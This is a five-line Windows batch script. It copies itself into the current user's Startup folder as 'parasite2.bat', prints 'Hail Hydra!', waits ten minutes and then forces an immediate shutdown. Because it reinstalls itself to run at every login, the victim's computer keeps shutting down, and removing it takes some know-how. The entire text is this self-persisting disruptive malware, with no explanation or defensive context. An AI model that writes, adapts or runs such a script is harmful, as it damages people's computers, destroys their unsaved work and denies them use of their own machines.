ECHO OFF
ECHO f|xcopy /y %~f0 "%appdata%\Microsoft\windows\start menu\Programs\Startup\parasite2.bat"
ECHO Hail Hydra!
timeout 600
shutdown /s /f /t 0
